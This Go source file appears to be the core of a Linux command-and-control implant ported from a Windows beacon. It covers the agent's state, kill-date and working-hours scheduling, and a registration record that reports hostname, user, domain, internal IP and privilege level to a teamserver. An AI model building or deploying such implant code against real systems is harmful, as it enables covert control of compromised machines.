package main

import (
	"crypto/rand"
	"encoding/binary"
	"sync"
	"time"
)

type agent struct {
	cfg  *Config
	info *HostInfo

	id         uint32
	sessionKey []byte

	out  *outbox
	jobs *jobManager
	dl   *downloader
	tun  *tunnelManager
	term *terminalManager

	startedAt time.Time

	mu         sync.Mutex
	terminated bool

	exitMethod uint32
	exitTask   uint32

	// asynchronous command state
	uploadMu sync.Mutex
	uploads  map[uint32]*uploadBuffer
}

func newAgent(cfg *Config) (*agent, error) {
	a := &agent{
		cfg:       cfg,
		info:      collectHostInfo(),
		out:       newOutbox(),
		startedAt: time.Now(),
		uploads:   make(map[uint32]*uploadBuffer),
	}

	var rnd [4]byte
	if _, err := rand.Read(rnd[:]); err != nil {
		return nil, err
	}
	a.id = binary.LittleEndian.Uint32(rnd[:])

	a.sessionKey = make([]byte, 16)
	if _, err := rand.Read(a.sessionKey); err != nil {
		return nil, err
	}

	a.jobs = newJobManager()
	a.dl = newDownloader(cfg.DownloadChunk)
	a.tun = newTunnelManager()
	a.term = newTerminalManager()

	return a, nil
}

// ---------------------------------------------------------------------------
// Response helpers
// ---------------------------------------------------------------------------

// reply emits [taskId][command][payload...] - the exact record layout produced
// by the Windows beacon.
func (a *agent) reply(taskID uint32, cmd uint32, fn func(*writer)) {
	a.out.emit(func(w *writer) {
		w.u32(taskID)
		w.u32(cmd)
		if fn != nil {
			fn(w)
		}
	})
}

// replyErr emits a COMMAND_ERROR record carrying a POSIX errno.
func (a *agent) replyErr(taskID uint32, err error) {
	code := uint32(errnoOf(err))
	a.reply(taskID, cmdError, func(w *writer) {
		w.u32(code)
	})
}

func (a *agent) replyErrorCode(taskID uint32, code uint32) {
	a.reply(taskID, cmdError, func(w *writer) {
		w.u32(code)
	})
}

// ---------------------------------------------------------------------------
// Lifecycle
// ---------------------------------------------------------------------------

func (a *agent) isTerminated() bool {
	a.mu.Lock()
	defer a.mu.Unlock()
	return a.terminated
}

func (a *agent) terminate(method, taskID uint32) {
	a.mu.Lock()
	a.terminated = true
	a.exitMethod = method
	a.exitTask = taskID
	a.mu.Unlock()
	a.out.signal()
}

func (a *agent) exitRecord() (uint32, uint32) {
	a.mu.Lock()
	defer a.mu.Unlock()
	return a.exitTask, a.exitMethod
}

// active reports whether the kill date has been reached.
func (a *agent) active() bool {
	if a.cfg.KillDate != 0 && uint32(time.Now().Unix()) >= a.cfg.KillDate {
		return false
	}
	return true
}

// workingSleep mirrors Agent::GetWorkingSleep from the Windows beacon. It
// returns the number of seconds to sleep until the next activity window, or 0
// when the agent may use its configured sleep.
func (a *agent) workingSleep() uint32 {
	wt := a.cfg.WorkingTime
	if wt == 0 {
		return 0
	}

	endM := (wt >> 0) & 0x3f
	endH := (wt >> 8) & 0x3f
	startM := (wt >> 16) & 0x3f
	startH := (wt >> 24) & 0x3f

	now := time.Now()
	hour, minute, second := now.Hour(), now.Minute(), now.Second()

	var sleepMinutes int
	switch {
	case hour < int(startH):
		sleepMinutes = (int(startH)-hour)*60 + (int(startM) - minute)
	case int(endH) < hour:
		sleepMinutes = (24-hour-1)*60 + (60 - minute)
		sleepMinutes += int(startH)*60 + int(startM)
	case hour == int(startH) && minute < int(startM):
		sleepMinutes = int(startM) - minute
	case hour == int(endH) && int(endM) <= minute:
		sleepMinutes = 23*60 + (60 + int(startM) - minute)
	default:
		return 0
	}
	if sleepMinutes <= 0 {
		return 0
	}
	secs := sleepMinutes*60 - second
	if secs < 0 {
		return 0
	}
	return uint32(secs)
}

// ---------------------------------------------------------------------------
// Registration beat
// ---------------------------------------------------------------------------

// buildBeat produces the plaintext registration structure. Field order and
// widths are identical to the Windows beacon up to process_name; the trailing
// Linux-only strings are read by this project's extender (the teamserver itself
// never parses the beat - the agent extender does).
func (a *agent) buildBeat() []byte {
	w := newWriter()

	w.u32(a.cfg.AgentType)
	w.u32(a.id)
	w.u32(a.cfg.Sleep)
	w.u32(a.cfg.Jitter)
	w.u32(a.cfg.KillDate)
	w.u32(a.cfg.WorkingTime)

	w.u16(65001) // ACP  - UTF-8 on Linux
	w.u16(65001) // OEMCP
	w.u8(uint8(int8(a.info.GmtOffset)))
	w.u16(uint16(a.info.Pid))
	w.u16(uint16(a.info.Tid))
	w.u32(uint32(a.info.KernelPatch))
	w.u8(uint8(a.info.KernelMajor))
	w.u8(uint8(a.info.KernelMinor))
	w.u32(ipToLong(a.info.InternalIP))

	var flag uint8
	if a.info.Arch64 {
		flag |= 1 << 0
	}
	flag |= 1 << 1 // sys64: Linux agents are native 64/32 bit, never WOW64
	if a.info.Elevated {
		flag |= 1 << 2
	}
	w.u8(flag)

	w.bytes(a.sessionKey)
	w.bytes([]byte(a.info.Domain))
	w.bytes([]byte(a.info.Hostname))
	w.bytes([]byte(a.info.Username))
	w.bytes([]byte(a.info.ProcessName))

	// Linux extensions
	w.bytes([]byte(a.info.OsRelease))
	w.bytes([]byte(a.info.Kernel))
	w.bytes([]byte(a.info.Arch))

	return w.buf
}
